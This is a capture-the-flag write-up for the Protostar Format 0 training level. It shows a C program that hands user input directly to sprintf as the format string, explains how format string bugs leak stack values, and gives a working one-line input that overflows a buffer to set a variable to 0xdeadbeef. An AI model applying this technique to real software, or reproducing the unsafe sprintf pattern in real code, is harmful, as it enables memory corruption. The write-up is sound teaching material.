# Protostar - Format 0

### About ###

>This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.
>
>**Hints**
>
> - This level should be done in less than 10 bytes of input.
> - “Exploiting format string vulnerabilities”
>
>This level is at /opt/protostar/bin/format0


### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

### Solution 

Functions of the `printf` family (`sfprintf`, `vsnprintf`, etc.) are variadic functions using a format string to display the values given as parmaters in a specific format.

For example, the following call to `printf` will output a `char *`, an `int` and a `char`.

```c
printf("%s %d %c", string, integer, character);
```

The parameters of the variadic function are put on the stack. `printf` uses the format string `%s %d %c` to know how many values to pop from the stack and how to interpret it. 

Format string bugs appear when the programmer leaves to the user the choice of the format string:

```c
printf(user_input);
```

In that case, a user can specify a format string such as `%x.%x.%x.%x.%x` and get the first five values of the stack, leading to an information leak that could be used to bypass software securities such as ASLR or Stack Smashing Protectors.

This first exercise uses a format string bug to exploit a buffer overflow with an input smaller than 10 bytes. We control the format string `string`and the goal is to overwrite the value of `target`.

This can be done with the format string `%64c`, which outputs 64 whitespaces, followed by `\xef\xbe\xad\xde`.

```
user@protostar:/tmp$ format0 $(python -c "print '%64c\xef\xbe\xad\xde'")
you have hit the target correctly :)
```